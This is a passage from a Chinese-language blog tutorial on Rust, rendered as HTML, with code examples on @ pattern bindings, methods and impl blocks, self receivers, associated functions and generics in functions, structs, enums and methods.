&#123;</span><br><span class="line">    <span class="comment">// 绑定新变量 `p`，同时对 `Point` 进行解构</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">p</span> @ Point &#123;x: px, y: py &#125; = Point &#123;x: <span class="number">10</span>, y: <span class="number">23</span>&#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;x: &#123;&#125;, y: &#123;&#125;&quot;</span>, px, py);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">point</span> = Point &#123;x: <span class="number">10</span>, y: <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">p</span> @ Point &#123;x: <span class="number">10</span>, y&#125; = point &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;x is 10 and y is &#123;&#125; in &#123;:?&#125;&quot;</span>, y, p);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;x was not 10 :(&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="新特性-Rust-1-53-新增"><a href="#新特性-Rust-1-53-新增" class="headerlink" title="@新特性(Rust 1.53 新增)"></a>@新特性(Rust 1.53 新增)</h6><p>考虑下面一段代码:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">match</span> <span class="number">1</span> &#123;</span><br><span class="line">        num @ <span class="number">1</span> | <span class="number">2</span> =&gt; &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, num);</span><br><span class="line">        &#125;</span><br><span class="line">        _ =&gt; &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译不通过，是因为 <code>num</code> 没有绑定到所有的模式上，只绑定了模式 <code>1</code>，你可能会试图通过这个方式来解决：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num @ (<span class="number">1</span> | <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>但是，如果你用的是 Rust 1.53 之前的版本，那这种写法会报错，因为编译器不支持。</p><p>至此，模式匹配的内容已经全部完结，复杂但是详尽，想要一次性全部记住属实不易，因此读者可以先留一个印象，等未来需要时，再来翻阅寻找具体的模式实现方式。</p><h3 id="方法Method"><a href="#方法Method" class="headerlink" title="方法Method"></a>方法Method</h3><h4 id="定义方法"><a href="#定义方法" class="headerlink" title="定义方法"></a>定义方法</h4><p>Rust使用impl来定义方法，例如以下代码：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Circle</span> &#123;</span><br><span class="line">    x: <span class="type">f64</span>,</span><br><span class="line">    y: <span class="type">f64</span>,</span><br><span class="line">    radius: <span class="type">f64</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Circle</span> &#123;</span><br><span class="line">    <span class="comment">// new是Circle的关联函数，因为它的第一个参数不是self，且new并不是关键字</span></span><br><span class="line">    <span class="comment">// 这种方法往往用于初始化当前结构体的实例</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>(x: <span class="type">f64</span>, y: <span class="type">f64</span>, radius: <span class="type">f64</span>) <span class="punctuation">-&gt;</span> Circle &#123;</span><br><span class="line">        Circle &#123;</span><br><span class="line">            x: x,</span><br><span class="line">            y: y,</span><br><span class="line">            radius: radius,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Circle的方法，&amp;self表示借用当前的Circle结构体</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">area</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">f64</span> &#123;</span><br><span class="line">        std::<span class="type">f64</span>::consts::PI * (<span class="keyword">self</span>.radius * <span class="keyword">self</span>.radius)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 我们来看看Rust和其它语言的区别:</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504091920787.png" alt="image-20250409192008695" loading="lazy"></p><p>我们可以看到其它语言中所有定义都在class中，但是Rust的对象定义和方法定义是分离的，这种数据和使用分离的方式会给使用者极高的灵活度</p><p>我们来看下面例子</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line">    width: <span class="type">u32</span>,</span><br><span class="line">    height: <span class="type">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">area</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.width * <span class="keyword">self</span>.height</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect1</span> = Rectangle &#123; width: <span class="number">30</span>, height: <span class="number">50</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(</span><br><span class="line">        <span class="string">&quot;The area of the rectangle is &#123;&#125; square pixels.&quot;</span>,</span><br><span class="line">        rect1.<span class="title function_ invoke__">area</span>()</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该例子定义了一个Rectangle结构体，并且在其定义了一个area方法，用于计算该矩阵的面积</p><p><code>impl Rectangle &#123;&#125;</code> 表示为 <code>Rectangle</code> 实现方法（<code>impl</code> 是实现 <em>implementation</em> 的缩写），这样的写法表明 <code>impl</code> 语句块中的一切都是跟 <code>Rectangle</code> 相关联的。</p><h4 id="self、-self和-mut-self"><a href="#self、-self和-mut-self" class="headerlink" title="self、&amp;self和&amp;mut self"></a>self、&amp;self和&amp;mut self</h4><p>在area的签名中，我们使用&amp;self替代rectangle:&amp;Rectangle，&amp;self其实是self:&amp;Self的简写（注意大小写）。在一个impl快内，Self指代被实现方法的结构体内向，self指代此类型的实例</p><p>换句话说，self指代的是Rectangle结构体实例，这样的写法会让代码简洁好多</p><p>需要注意的是，<code>self</code> 依然有所有权的概念：</p><ul><li><code>self</code> 表示 <code>Rectangle</code> 的所有权转移到该方法中，这种形式用的较少</li><li><code>&amp;self</code> 表示该方法对 <code>Rectangle</code> 的不可变借用</li><li><code>&amp;mut self</code> 表示可变借用</li></ul><p> 我们并不想获取所有权，也无需去改变它，只是希望能够读取结构体中的数据就使用&amp;self，而当我们需要去改变当前结构体时，就需要使用&amp;mut self</p><p>简单总结下，使用方法代替函数有以下好处：</p><ul><li>不用在函数签名中重复书写 <code>self</code> 对应的类型</li><li>代码的组织性和内聚性更强，对于代码维护和阅读来说，好处巨大</li></ul><h4 id="方法名跟结构体字段名相同"><a href="#方法名跟结构体字段名相同" class="headerlink" title="方法名跟结构体字段名相同"></a>方法名跟结构体字段名相同</h4><p>在Rust中，允许方法名跟结构体字段名相同：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">width</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">bool</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.width &gt; <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect1</span> = Rectangle &#123;</span><br><span class="line">        width: <span class="number">30</span>,</span><br><span class="line">        height: <span class="number">50</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> rect1.<span class="title function_ invoke__">width</span>() &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;The rectangle has a nonzero width; it is &#123;&#125;&quot;</span>, rect1.width);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们使用 <code>rect1.width()</code> 时，Rust 知道我们调用的是它的方法，如果使用 <code>rect1.width</code>，则是访问它的字段。</p><h4 id="带多个参数的方法"><a href="#带多个参数的方法" class="headerlink" title="带多个参数的方法"></a>带多个参数的方法</h4><p>方法和函数一样， 可以使用多个参数:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">area</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.width * <span class="keyword">self</span>.height</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">can_hold</span>(&amp;<span class="keyword">self</span>, other: &amp;Rectangle) <span class="punctuation">-&gt;</span> <span class="type">bool</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.width &gt; other.width &amp;&amp; <span class="keyword">self</span>.height &gt; other.height</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect1</span> = Rectangle &#123; width: <span class="number">30</span>, height: <span class="number">50</span> &#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect2</span> = Rectangle &#123; width: <span class="number">10</span>, height: <span class="number">40</span> &#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect3</span> = Rectangle &#123; width: <span class="number">60</span>, height: <span class="number">45</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Can rect1 hold rect2? &#123;&#125;&quot;</span>, rect1.<span class="title function_ invoke__">can_hold</span>(&amp;rect2));</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Can rect1 hold rect3? &#123;&#125;&quot;</span>, rect1.<span class="title function_ invoke__">can_hold</span>(&amp;rect3));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="关联函数"><a href="#关联函数" class="headerlink" title="关联函数"></a>关联函数</h4><p>如何为一个结构体定义一个构造器方法？也就是接受几个参数，然后构造并返回该结构体的实例，很简单，参数中不包含 <code>self</code> 即可</p><p>这种定义在 <code>impl</code> 中且没有 <code>self</code> 的函数被称之为<strong>关联函数</strong>： 因为它没有 <code>self</code>，不能用 <code>f.read()</code> 的形式调用，因此它是一个函数而不是方法，但它又在impl中，与结构体紧密关联，因此称为关联函数</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>(w: <span class="type">u32</span>, h: <span class="type">u32</span>) <span class="punctuation">-&gt;</span> Rectangle &#123;</span><br><span class="line">        Rectangle &#123; width: w, height: h &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="多个impl定义"><a href="#多个impl定义" class="headerlink" title="多个impl定义."></a>多个impl定义.</h4><p>Rust 允许我们为一个结构体定义多个 <code>impl</code> 块，目的是提供更多的灵活性和代码组织性，例如当方法多了后，可以把相关的方法组织在同一个 <code>impl</code> 块中，那么就可以形成多个 <code>impl</code> 块，各自完成一块儿目标：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">area</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.width * <span class="keyword">self</span>.height</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">can_hold</span>(&amp;<span class="keyword">self</span>, other: &amp;Rectangle) <span class="punctuation">-&gt;</span> <span class="type">bool</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.width &gt; other.width &amp;&amp; <span class="keyword">self</span>.height &gt; other.height</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="为枚举实现方法"><a href="#为枚举实现方法" class="headerlink" title="为枚举实现方法"></a>为枚举实现方法</h4><p>枚举类型之所以强大，不仅仅在于它好用、可以<a href="https://course.rs/basic/compound-type/enum.html#%E5%90%8C%E4%B8%80%E5%8C%96%E7%B1%BB%E5%9E%8B">同一化类型</a>，还在于，我们可以像结构体一样，为枚举实现方法：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#![allow(unused)]</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">    Quit,</span><br><span class="line">    Move &#123; x: <span class="type">i32</span>, y: <span class="type">i32</span> &#125;,</span><br><span class="line">    <span class="title function_ invoke__">Write</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">ChangeColor</span>(<span class="type">i32</span>, <span class="type">i32</span>, <span class="type">i32</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">call</span>(&amp;<span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="comment">// 在这里定义方法体</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">m</span> = Message::<span class="title function_ invoke__">Write</span>(<span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    m.<span class="title function_ invoke__">call</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了结构体和枚举，我们还能为特征(trait)实现方法，在此之前，先来看看泛型。</p><h3 id="泛型和特征"><a href="#泛型和特征" class="headerlink" title="泛型和特征"></a>泛型和特征</h3><h4 id="泛型Generics"><a href="#泛型Generics" class="headerlink" title="泛型Generics"></a>泛型Generics</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">add</span>&lt;T&gt;(a:T, b:T) <span class="punctuation">-&gt;</span> T &#123;</span><br><span class="line">    a + b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;add i8: &#123;&#125;&quot;</span>, <span class="title function_ invoke__">add</span>(<span class="number">2i8</span>, <span class="number">3i8</span>));</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;add i32: &#123;&#125;&quot;</span>, <span class="title function_ invoke__">add</span>(<span class="number">20</span>, <span class="number">30</span>));</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;add f64: &#123;&#125;&quot;</span>, <span class="title function_ invoke__">add</span>(<span class="number">1.23</span>, <span class="number">1.23</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码T就是泛型参数，实际上在Rust中，泛型参数的名称可以随便起，但是出于惯例，我们都是用T来作为首选</p><p>使用泛型参数，有一个先决条件，必需在使用前对其进行声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fn largest&lt;T&gt;(list: &amp;[T]) -&gt; T &#123;</span><br></pre></td></tr></table></figure><p> 该泛型函数的作用是从列表中找出最大的值，其中列表中的元素类型为 T。首先 <code>largest&lt;T&gt;</code> 对泛型参数 <code>T</code> 进行了声明，然后才在函数参数中进行使用该泛型参数 <code>list: &amp;[T]</code> （还记得 <code>&amp;[T]</code> 类型吧？这是<a href="https://course.rs/basic/compound-type/array.html#%E6%95%B0%E7%BB%84%E5%88%87%E7%89%87">数组切片</a>）。</p><p>总之，我们可以这样理解这个函数定义：函数 <code>largest</code> 有泛型类型 <code>T</code>，它有个参数 <code>list</code>，其类型是元素为 <code>T</code> 的数组切片，最后，该函数返回值的类型也是 <code>T</code>。</p><h5 id="显式地指定泛型的类型参数"><a href="#显式地指定泛型的类型参数" class="headerlink" title="显式地指定泛型的类型参数"></a>显式地指定泛型的类型参数</h5><p>有时候，编译器无法推断你想要的泛型参数:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::fmt::Display;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">create_and_print</span>&lt;T&gt;() <span class="keyword">where</span> T: <span class="built_in">From</span>&lt;<span class="type">i32</span>&gt; + Display &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span>: T = <span class="number">100</span>.<span class="title function_ invoke__">into</span>(); <span class="comment">// 创建了类型为 T 的变量 a，它的初始值由 100 转换而来</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;a is: &#123;&#125;&quot;</span>, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="title function_ invoke__">create_and_print</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码直接运行会报错，我们修改代码，使用显式指定类型:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::fmt::Display;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">create_and_print</span>&lt;T&gt;() <span class="keyword">where</span> T: <span class="built_in">From</span>&lt;<span class="type">i32</span>&gt; + Display &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span>: T = <span class="number">100</span>.<span class="title function_ invoke__">into</span>(); <span class="comment">// 创建了类型为 T 的变量 a，它的初始值由 100 转换而来</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;a is: &#123;&#125;&quot;</span>, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    create_and_print::&lt;<span class="type">i64</span>&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="结构体中使用泛型"><a href="#结构体中使用泛型" class="headerlink" title="结构体中使用泛型"></a>结构体中使用泛型</h5><p>结构体中的字段类型也可以用泛型来定义，下面的代码定义了一个坐标点Point，它可以存放任何类型的坐标值</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span>&lt;T&gt;&#123;</span><br><span class="line">x:T,</span><br><span class="line">y:T,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">integer</span>=Point&#123;x:<span class="number">5</span>,y:<span class="number">10</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">float</span>=Point&#123;x:<span class="number">1.0</span>,y:<span class="number">4.0</span>&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有两点需要注意</p><ul><li><strong>提前声明</strong>，跟泛型函数定义类似，首先我们在使用泛型参数之前必需要进行声明 <code>Point&lt;T&gt;</code>，接着就可以在结构体的字段类型中使用 <code>T</code> 来替代具体的类型</li><li><strong>x 和 y 是相同的类型</strong></li></ul><p>第二点非常重要，如果使用不同的类型，那么它会导致下面代码的报错:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span>&lt;T&gt; &#123;</span><br><span class="line">    x: T,</span><br><span class="line">    y: T,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">p</span> = Point&#123;x: <span class="number">1</span>, y :<span class="number">1.1</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>x是整数类型，y是浮点数类型的，会发生报错</p><p>如果我们想要x,y既能类型相同，又能类型不同，那我们需要使用不同的泛型参数:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span>&lt;T,U&gt; &#123;</span><br><span class="line">    x: T,</span><br><span class="line">    y: U,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">p</span> = Point&#123;x: <span class="number">1</span>, y :<span class="number">1.1</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>切记，所有的泛型参数都要提前声明：<code>Point&lt;T,U&gt;</code> ! 但是如果你的结构体变成这鬼样：<code>struct Woo&lt;T,U,V,W,X&gt;</code>，那么你需要考虑拆分这个结构体，减少泛型参数的个数和代码复杂度。</p><h5 id="枚举中使用泛型"><a href="#枚举中使用泛型" class="headerlink" title="枚举中使用泛型"></a>枚举中使用泛型</h5><p>提到枚举类型，<code>Option</code>永远是第一个应该被想起来的</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Option</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="title function_ invoke__">Some</span>(T),</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Option<T>是一个拥有泛型T的枚举类型，它的第一个成员是Some(T)，存放了一个类型为T的值。</p><p>得益于泛型的引入，我们可以在任何一个需要返回值的函数中，去使用 <code>Option&lt;T&gt;</code> 枚举类型来做为返回值，用于返回一个任意类型的值 <code>Some(T)</code>，或者没有值 <code>None</code>。</p><p>对于枚举而言，卧龙凤雏永远是绕不过去的存在：如果是 <code>Option</code> 是卧龙，那么 <code>Result</code> 就一定是凤雏，得两者可得天下：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Result</span>&lt;T, E&gt; &#123;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(T),</span><br><span class="line">    <span class="title function_ invoke__">Err</span>(E),</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个枚举和Option一样，主要用于函数返回值，与<code>Option</code>用于值的存在与否不同，<code>Result</code>关注的主要是值的正确性。</p><h5 id="方法中使用泛型"><a href="#方法中使用泛型" class="headerlink" title="方法中使用泛型"></a>方法中使用泛型</h5><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span>&lt;T&gt; &#123;</span><br><span class="line">    x: T,</span><br><span class="line">    y: T,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span>&lt;T&gt; Point&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">x</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> &amp;T &#123;</span><br><span class="line">        &amp;<span class="keyword">self</span>.x</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">p</span> = Point &#123; x: <span class="number">5</span>, y: <span class="number">10</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;p.x = &#123;&#125;&quot;</span>, p.<span class="title function_ invoke__">x</span>());</span><br><span 